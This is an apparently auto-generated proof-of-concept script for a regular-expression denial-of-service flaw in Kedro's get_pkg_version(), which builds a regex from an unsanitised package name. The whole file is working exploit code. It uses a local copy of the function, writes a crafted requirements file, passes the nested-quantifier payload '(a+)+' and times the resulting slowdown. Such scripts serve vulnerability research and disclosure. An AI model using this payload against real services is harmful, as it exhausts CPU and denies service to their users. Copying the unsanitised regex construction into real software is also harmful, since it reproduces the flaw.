#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: redos-010
# Sink: get_pkg_version
# Auto-generated — run with: python3 redos_pattern_used_re_get_pkg_version.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for ReDoS vulnerability in Kedro's get_pkg_version().

Vulnerability: The function compiles a regex pattern using user-controlled
package_name without sanitization. An attacker can supply a package_name
containing nested quantifiers (e.g., (a+)+) and a crafted requirements file
with a long string that triggers catastrophic backtracking, causing a denial
of service.

This PoC demonstrates the vulnerability by:
1. Creating a temporary directory with a malicious requirements.txt file.
2. Calling get_pkg_version() with a crafted package_name that causes ReDoS.
3. Measuring the execution time to show the exponential slowdown.

WARNING: This script may cause high CPU usage. Use with caution.
"""

import re
import time
import tempfile
import os
import sys
from pathlib import Path

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
# The malicious package_name with nested quantifiers to trigger catastrophic backtracking
MALICIOUS_PACKAGE_NAME = "(a+)+"

# The content of the requirements file that will cause backtracking
# This is a long string of 'a's followed by a character that doesn't match
# the pattern's trailing assertion, forcing the regex engine to backtrack
# exponentially.
MALICIOUS_FILE_CONTENT = "a" * 30 + "b"

# ---------------------------------------------------------------------------
# Simulated vulnerable function (exact copy from Kedro source)
# ---------------------------------------------------------------------------
def get_pkg_version(reqs_path, package_name):
    """Get package version from requirements.txt (vulnerable version)."""
    reqs_path = Path(reqs_path).absolute()
    if not reqs_path.is_file():
        raise FileNotFoundError(f"Given path '{reqs_path}' is not a regular file.")

    # VULNERABLE: package_name is directly concatenated into regex pattern
    pattern = re.compile(package_name + r"([^\w]|$)")
    with reqs_path.open("r", encoding="utf-8") as reqs_file:
        for req_line in reqs_file:
            req_line = req_line.strip()
            if pattern.search(req_line):
                return req_line

    raise ValueError(f"Cannot find '{package_name}' package in '{reqs_path}'.")

# ---------------------------------------------------------------------------
# Exploit demonstration
# ---------------------------------------------------------------------------
def main():
    print("[*] Kedro ReDoS Proof-of-Concept")
    print(f"[*] Malicious package_name: {MALICIOUS_PACKAGE_NAME!r}")
    print(f"[*] File content length: {len(MALICIOUS_FILE_CONTENT)} characters")
    print()

    # Create a temporary directory and malicious requirements file
    with tempfile.TemporaryDirectory() as tmpdir:
        reqs_path = os.path.join(tmpdir, "requirements.txt")
        with open(reqs_path, "w", encoding="utf-8") as f:
            f.write(MALICIOUS_FILE_CONTENT + "\n")

        print(f"[*] Created malicious requirements file at: {reqs_path}")
        print(f"[*] File content: {MALICIOUS_FILE_CONTENT!r}")
        print()

        # Measure execution time
        print("[*] Calling get_pkg_version() with malicious input...")
        start_time = time.time()
        try:
            result = get_pkg_version(reqs_path, MALICIOUS_PACKAGE_NAME)
            elapsed = time.time() - start_time
            print(f"[!] Function returned: {result!r}")
            print(f"[!] Execution time: {elapsed:.4f} seconds")
        except Exception as e:
            elapsed = time.time() - start_time
            print(f"[!] Exception raised: {e}")
            print(f"[!] Execution time before exception: {elapsed:.4f} seconds")

        print()
        print("[*] Expected behavior: The regex engine will attempt catastrophic")
        print("    backtracking on the long string of 'a's, causing significant")
        print("    slowdown compared to normal operation.")
        print()
        print("[*] To verify, compare with a benign package_name like 'numpy'")
        print("    which should complete almost instantly.")

        # Optional: demonstrate benign case for comparison
        print()
        print("[*] Running benign comparison (package_name='numpy')...")
        benign_start = time.time()
        try:
            # Create a benign file that actually contains 'numpy'
            benign_path = os.path.join(tmpdir, "benign_requirements.txt")
            with open(benign_path, "w", encoding="utf-8") as f:
                f.write("numpy==1.21.0\n")
            result_benign = get_pkg_version(benign_path, "numpy")
            benign_elapsed = time.time() - benign_start
            print(f"[*] Benign result: {result_benign!r}")
            print(f"[*] Benign execution time: {benign_elapsed:.4f} seconds")
        except Exception as e:
            benign_elapsed = time.time() - benign_start
            print(f"[*] Benign exception: {e}")
            print(f"[*] Benign execution time: {benign_elapsed:.4f} seconds")

        print()
        if elapsed > 1.0:
            print("[!] VULNERABLE: Significant slowdown detected (ReDoS confirmed)")
        else:
            print("[*] Note: For full ReDoS effect, increase the length of 'a's")
            print("    in MALICIOUS_FILE_CONTENT (e.g., 50+ characters).")

if __name__ == "__main__":
    main()
